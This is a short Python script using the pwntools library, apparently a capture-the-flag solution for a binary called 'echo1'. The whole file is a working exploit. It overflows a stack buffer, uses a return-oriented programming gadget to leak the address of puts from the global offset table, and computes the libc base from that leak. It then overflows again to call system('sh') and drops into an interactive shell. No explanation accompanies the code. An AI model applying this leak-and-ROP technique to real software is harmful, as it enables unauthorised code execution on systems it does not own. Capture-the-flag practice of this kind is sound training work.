from pwn import *
p=process("./echo1")
elf=context.binary=ELF("./echo1")
libc=ELF(p.libc.path)
# mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
SET_EDI_GADGET = 0x400b10
RET_GADGET = 0x04008b0
id_addr = 0x6020a0

# Leak libc
p.sendline(b"marker")
p.sendline(b"1")
payload = b"A"*32 + b"B"*8 + p64(SET_EDI_GADGET)
payload = payload.ljust(0x60, b"C")
payload += p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['main'])
p.sendline(payload)
p.recvuntil(b"goodbye marker\n")
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc.address = leak - libc.sym['puts']
p.success(f"Libc base address: {hex(libc.address)}")
p.success(f"System address: {hex(libc.sym['system'])}")

# system("sh")
p.sendline(b"sh")
p.sendline(b"1")
payload = b"A"*32 + b"B"*8 + p64(SET_EDI_GADGET) 
payload = payload.ljust(0x60, b"C")
payload += p64(id_addr) + p64(RET_GADGET) + p64(libc.sym['system']) 
p.sendline(payload)

p.interactive()
